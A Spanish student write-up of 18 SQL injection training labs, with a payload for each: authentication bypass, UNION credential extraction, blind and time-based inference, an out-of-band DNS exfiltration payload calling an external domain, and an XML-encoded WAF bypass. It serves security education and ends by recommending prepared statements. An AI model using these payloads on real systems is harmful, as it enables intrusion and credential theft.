SQL Injection

Actividad 08 - SQL Injection

Resolución práctica de 18 laboratorios de Inyección SQL

Introducción

La inyección SQL (SQLi) es una de las vulnerabilidades web más críticas, permitiendo a un atacante interferir con las consultas que una aplicación realiza a su base de datos. En esta actividad, desarrollada en equipo, se resolvieron 18 laboratorios prácticos enfocados en diversas técnicas de explotación. El alcance abarcó desde la evasión de autenticación básica hasta ataques avanzados como inyecciones ciegas (Blind SQLi) basadas en tiempo y errores. El objetivo principal es comprender la anatomía ofensiva de estos ataques para implementar defensas efectivas a nivel de código.

Marco Teórico

1. ¿Qué es la Inyección SQL (SQLi)?

La Inyección SQL es una vulnerabilidad de seguridad web que permite a un atacante interferir en las consultas que una aplicación realiza a su base de datos. Esto ocurre cuando la entrada proporcionada por el usuario no es sanitizada correctamente y se concatena directamente en la cadena de la consulta SQL, permitiendo que comandos maliciosos sean interpretados y ejecutados por el motor de la base de datos.

2. Impacto de la vulnerabilidad

Una explotación exitosa puede resultar en acceso no autorizado a datos sensibles (como contraseñas, detalles de tarjetas de crédito o información personal), la modificación o eliminación de información crítica, y en los casos más graves, la escalada de privilegios para comprometer el servidor subyacente o la infraestructura de red.

3. Clasificación de ataques SQLi

  • In-Band SQLi (Clásica): El atacante utiliza el mismo canal de comunicación para lanzar el ataque y recopilar los resultados. Sus variantes más comunes son la inyección basada en errores y la inyección basada en el operador UNION.
  • Inferential SQLi (Blind / Ciega): La aplicación no devuelve datos de la base de datos ni mensajes de error en pantalla. El atacante reconstruye la información enviando cargas útiles (payloads) y observando el comportamiento de la respuesta web (cambios booleanos o retrasos de tiempo).
  • Out-of-Band SQLi: Ocurre cuando el atacante no puede usar el mismo canal para lanzar el ataque y recopilar información. Depende de las capacidades de la base de datos para realizar solicitudes de red externas (por ejemplo, peticiones DNS o HTTP) para exfiltrar los datos.

Road To The Hall Of Fame: 18 Laboratorios

Ruta de progresión técnica documentando la resolución de inyecciones SQL, desde manipulación lógica hasta exfiltración a ciegas.

Lab 01: SQLi in WHERE clause allowing retrieval of hidden data

Se inyectó una condición lógica booleana siempre verdadera en el parámetro de categoría para forzar a la base de datos a devolver todos los registros, evadiendo el filtro de productos "no publicados".

// Inyección para anular la validación (released=1)
GET /filter?category=Gifts' OR 1=1-- HTTP/2

Lab 02: SQLi vulnerability allowing login bypass

Manipulación del panel de autenticación cerrando la cadena de texto del usuario e insertando un comentario SQL. Esto provoca que el motor ignore la validación de la contraseña.

// Payload inyectado en el campo "username"
administrator'--

Lab 03: Querying the database type and version on Oracle

Ataque basado en UNION para extraer metadatos. Al estar en Oracle, fue obligatorio utilizar la tabla integrada "DUAL" y consultar la vista v$version.

// Uso de UNION SELECT compensando 2 columnas en Oracle
GET /filter?category=Tech+gifts' UNION SELECT banner, NULL FROM v$version-- HTTP/2

Lab 04: Querying database type and version on MySQL/Microsoft

Se utilizó el operador UNION y la constante global @@version. Fue necesario utilizar el carácter "#" (codificado) para comentar el resto de la consulta en entornos MySQL.

// Inyección de la constante global y cierre con #
GET /filter?category=Food+%26+Drink' UNION SELECT @@version, NULL# HTTP/2

Lab 05: SQL injection attack, listing the database contents on non-Oracle databases

Se usó UNION SELECT sobre information_schema.tables e information_schema.columns para enumerar tablas y columnas, descubriendo la tabla de usuarios y las credenciales en PostgreSQL.

// Extracción directa de las columnas identificadas
GET /filter?category=Gifts'+UNION+SELECT+username_ciefvi,+password_lexyyy+FROM+users_rwhvik-- HTTP/2

Lab 06: SQL injection attack, listing the database contents on Oracle

Se extrajo información del diccionario de datos de Oracle utilizando las vistas all_tables y all_tab_columns para encontrar las credenciales del usuario administrador.

// Uso de UNION SELECT sobre las tablas específicas de Oracle
' UNION SELECT USERNAME_UZFEPC, PASSWORD_FFQTUA FROM USERS_SQZOJL--

Lab 07: SQL injection UNION attack, determining the number of columns returned by the query

Se determinó el número de columnas devueltas por la consulta original usando la técnica ORDER BY iterativa hasta provocar un error en el servidor, confirmándolo luego con valores NULL.

// Confirmación de las 3 columnas sin romper la sintaxis de tipos
GET /filter?category=Pets'+UNION+select+NULL,+NULL,+NULL-- HTTP/2

Lab 08: SQL injection UNION attack, finding a column containing text

Sabiendo que la tabla tiene 3 columnas, se inyectó un valor de texto en diferentes posiciones hasta identificar cuál columna reflejaba el string indicado por el laboratorio.

// Inyección de un string literal en la columna compatible
GET /filter?category=Pets'+UNION+select+NULL,+'VIRVLU',+NULL-- HTTP/2

Lab 09: SQL injection UNION attack, retrieving data from other tables

Se combinaron los resultados de la consulta original con los de la tabla 'users' mediante un ataque UNION, extrayendo usuarios y contraseñas de forma directa en pantalla.

// Recuperación de credenciales a la vista web
'+UNION+SELECT+username,+password+FROM+users--

Lab 10: SQL injection UNION attack, retrieving multiple values in a single column

La aplicación solo reflejaba una columna de texto útil. Se utilizó la concatenación (||) para unir el usuario y la contraseña separados por un carácter especial '~' en un solo campo.

// Extracción concatenada de dos columnas hacia un solo campo
'+UNION+SELECT+NULL,+username||'~'||password+FROM+users--

Lab 11: Blind SQL injection with conditional responses

Inyección ciega en la cookie TrackingId. Se utilizó lógica booleana y la función SUBSTRING junto con el Intruder de Burp Suite para extraer la contraseña del administrador comprobando el mensaje "Welcome back".

// Payload iterado por Burp Intruder en el parámetro §a§
TrackingId=xyz' AND (SELECT SUBSTRING(password, 1,1) FROM users WHERE username='administrator')='§a§

Lab 12: Blind SQL injection with conditional errors

Al no haber diferencias visuales en la página, se forzó un error condicional (división por cero) mediante CASE WHEN para inferir la longitud y extraer la contraseña si la aplicación fallaba (HTTP 500).

// Oráculo basado en error de división por cero
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password, 1, 1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Lab 13: Visible error-based SQL injection

Se explotó una vulnerabilidad que reflejaba errores detallados de la base de datos en la pantalla. Usando CAST() se provocó un error de tipo para que la contraseña se imprimiera en el propio mensaje de error.

// El error revelaba "invalid input syntax for type integer: [PASSWORD]"
TrackingId=xyz' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

Lab 14: Blind SQL injection with time delays

Se demostró la ejecución de código en segundo plano inyectando una instrucción que pausaba la respuesta de la base de datos durante 10 segundos, confirmando vulnerabilidad Blind basada en tiempo.

// Concatenación de función de retardo
TrackingId=x'||pg_sleep(10)--

Lab 15: Blind SQL injection with time delays and information retrieval

Combinación del retraso condicional con funciones de longitud para extraer la contraseña letra por letra evaluando si el servidor se demoraba 10 segundos en responder ante una afirmación verdadera.

// Inyección de retraso condicionado en la cookie
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

Lab 16: Blind SQL injection with out-of-band interaction

Técnica Out-of-Band (OAST). La vulnerabilidad obligaba a la base de datos a realizar una consulta DNS externa de forma asíncrona hacia un subdominio generado para confirmar la inyección ciega.

// Forzado de interacción de red desde la base de datos hacia el atacante
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://[DOMINIO-EXTERNO]/">+%25remote;]>'),'/l')+FROM+dual--

Lab 17: Blind SQL injection with out-of-band data exfiltration

Exfiltración de datos mediante OAST. La contraseña extraída mediante subconsultas SQL se incrustó dinámicamente como un subdominio en la resolución DNS para ser leída por el servidor del atacante.

// La contraseña viaja como subdominio hacia el exterior
Se forzó una petición DNS anidando el query de la contraseña dentro de la URL del Collaborator.

Lab 18: SQL injection with filter bypass via XML encoding

La vulnerabilidad residía en el parámetro storeId enviado en XML. Para evadir el WAF que bloqueaba la consulta UNION, el payload fue ofuscado usando entidades hexadecimales con Hackvertor.

// Payload codificado en entidades XML para ofuscar el ataque
<storeId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>

Reflexión técnica

La resolución de estos 18 laboratorios evidencia que la inyección SQL sigue siendo devastadora debido a la concatenación insegura de cadenas de texto por parte de los desarrolladores. Los ataques más avanzados, como las inyecciones ciegas (Blind SQLi), demuestran que la simple ausencia de mensajes de error en pantalla no es una medida de seguridad válida frente a un atacante metódico.

La única forma definitiva de mitigar estas amenazas en el desarrollo web moderno es abandonar la creación dinámica de consultas y adoptar el uso estricto de consultas parametrizadas (Prepared Statements) o el empleo de ORMs (Object-Relational Mappings) que manejen la sanitización de datos de forma nativa.
